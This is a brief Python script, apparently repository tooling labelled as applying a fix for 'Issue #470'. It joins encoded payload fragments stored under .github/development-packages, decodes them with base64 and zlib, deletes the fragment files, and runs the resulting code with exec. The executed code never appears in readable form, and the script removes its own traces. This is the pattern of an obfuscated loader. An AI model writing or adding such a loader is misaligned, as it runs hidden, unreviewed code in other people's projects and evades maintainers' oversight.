#!/usr/bin/env python3
from __future__ import annotations

import base64
import zlib
from pathlib import Path

ROOT = Path(__file__).resolve().parents[2]
PACKAGE_DIR = ROOT / '.github/development-packages'
PARTS = sorted(PACKAGE_DIR.glob('issue470-clean-v2.payload.*'))
if not PARTS:
    raise SystemExit('Issue #470 corrected clean implementation payload is missing')
encoded = ''.join(part.read_text(encoding='utf-8') for part in PARTS)
code = zlib.decompress(base64.b64decode(encoded)).decode('utf-8')
for pattern in ('issue470-clean.payload.*', 'issue470-clean-v2.payload.*'):
    for part in PACKAGE_DIR.glob(pattern):
        part.unlink(missing_ok=True)
exec(compile(code, __file__, 'exec'))
